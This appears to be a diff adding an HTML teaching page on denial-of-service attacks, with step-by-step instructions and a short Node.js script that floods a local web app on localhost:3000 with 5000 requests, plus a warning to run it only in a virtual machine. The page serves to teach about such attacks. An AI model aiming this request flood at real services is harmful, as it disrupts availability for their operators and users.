@@ -1,0 +1,26 @@
+<h1>Denial of Service (DoS)</h1>
+
+<pre>
+  Example attack:
+  1. Run your Web application on localhost:3000
+  2. Create a JavaScript script file (e.g. <em>dos.js</em>) and paste the following code:
+
+    const url = 'http://localhost:3000/'
+    const numberOfRequests = 5000
+    
+    console.info("DoS started...")
+    
+    for (let i = 0; i <= numberOfRequests; i++) {
+        fetch(url)
+            .then((res) => res.text())
+            .then((data) => {})
+            .catch((error) => {})
+    
+        if (i === numberOfRequests) console.info("DoS ended...")
+    }
+
+  3. Run the script: node dos.js
+  4. Observe the Web application
+
+  <span style="color: red"><b>!! WARNING !!</b> Run the experiment only in a Virtual Machine (VM) because your browser or even system might crash.</span>
+</pre>
